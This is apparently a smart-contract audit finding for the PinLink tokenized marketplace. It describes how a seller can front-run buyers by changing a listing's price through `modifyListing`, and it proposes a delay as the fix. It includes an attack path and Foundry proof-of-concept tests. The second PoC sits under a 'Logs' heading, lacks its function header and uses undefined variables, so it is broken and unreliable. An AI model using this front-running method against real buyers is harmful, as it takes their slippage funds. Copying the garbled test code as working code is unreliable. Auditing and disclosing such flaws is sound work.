# Attacker can Front-Run their Buyers and Change the Price of their Listing

### Summary

The [`modifyListing`](https://github.com/sherlock-audit/2025-03-pinlink-rwa-tokenized-depin-marketplace/blob/main/marketplace-contracts/src/marketplaces/pinlinkShop.sol#L269-L282) function sets the `price` and `deadline` without any delay which can cause devious sellers to front-run the purchase and get more money than they are entitled to.

### Root Cause

In the [`modifyListing`](https://github.com/sherlock-audit/2025-03-pinlink-rwa-tokenized-depin-marketplace/blob/main/marketplace-contracts/src/marketplaces/pinlinkShop.sol#L269-L282) function, the seller can change both the `price` and `deadline` of their listing without any delay whatsoever. 

This can cause two front-running attacks as stated below: 
1. Attackers can arbitrarily increase the price of their listing when buyers with high slippage calls the `purchase` function. 
2. Attackers can deliberately cause the buyer's `purchase` function to revert by increasing the price. 

### Internal Pre-conditions

1. Seller needs to list their `fractionalAssets` for sale. 

### External Pre-conditions

1. A buyer needs to see the deal, and call the `purchase` function. 

### Attack Path

1. The attacker will list a normal `fractionalAsset` for sale. 
2. The attacker will wait till somebody wants to buy their asset. 
3. If the `slippage` of the buyer is low, the attacker will front-run their offer and increase the `usdPricePerFraction` using the `modifyListing` function. This will cause the buyer to revert. 
4. The attacker will wait till somebody with a lot of slippage calls the purchase function. 
5. If the `slippage` is enough profit for the attacker, the attacker will front-run their offer and increase the `usdPricePerFraction` enough to not trigger the slippage. 
6. The attacker gets away with a lot more money than they are entitled to. 

### Impact

The user will be scammed out of the slippage spread they kept for their own protection. They will end up paying more money than they would have. 

### PoC

There are 2 PoCs. You can put it in `marketplace-contracts/test/pinlinkShop/modifyListing.t.sol`: 

```solidity
function test_modifyListing_frontrunning_revert() public {
        Listing memory listing = pshop.getListing(listingId);
        uint256 newDeadline = listing.deadline;

        console.log("when attacker modifies their listing, there is no delay"); 
        vm.prank(alice);
        pshop.modifyListing(listingId, 800e18, newDeadline);

        uint amount = 30; 
        console.log("buyer wants to buy", amount, "Fractions");         

        uint256 pinAmount = pshop.getQuoteInTokens(listingId, amount);
        console.log("buyer has to pay %e", pinAmount, "pinAmount"); 
        if (pinAmount == type(uint256).max) revert("Invalid quote for some reason");

        vm.prank(alice);
        pshop.modifyListing(listingId, 2000e18, newDeadline);
        console.log("attacker does not like their slippage so they revert the transaction by front-running it"); 
        console.log("the price changes immediately after calling the function"); 

        vm.startPrank(bob);
        vm.expectRevert(); 
        pshop.purchase(listingId, amount, pinAmount); 
        console.log("buyer's transaction reverts"); 
    }
```

Logs: 
```bash

        vm.prank(alice);
        pshop.modifyListing(listingId, 800e18, newDeadline);

        Listing memory updatedListing = pshop.getListing(listingId);
        
        uint amount = 30;

        console.log("buyer has to pay %e", pinAmount, "pinAmount"); 
        if (pinAmount == type(uint256).max) revert("Invalid quote for some reason");

        uint pinMaxSlippage = (pinAmount * 110) / 100; 
        console.log("buyer sets pinMaxSlippage to %e", pinMaxSlippage); 
        
        // console.log("usd price", updatedListing.usdPricePerFraction); 
        uint new_price = (updatedListing.usdPricePerFraction * 1e18) / pinMaxSlippage; 
        console.log("attacker front-runs and changes price according to the buyer's slippage %e", new_price); 
        vm.prank(alice);
        pshop.modifyListing(listingId, new_price, newDeadline);
        console.log("the price changes immediately after calling the function"); 

        uint bob_starting_bal = PIN.balanceOf(address(bob)); 
        vm.startPrank(bob);
        pshop.purchase(listingId, amount, pinMaxSlippage); 
        console.log("buyer buys the amount with high slippage %e", bob_starting_bal - PIN.balanceOf(address(bob))); 
    }
```

### Mitigation

A delay after which the `price` and `deadline` will update will be the best solution for this.
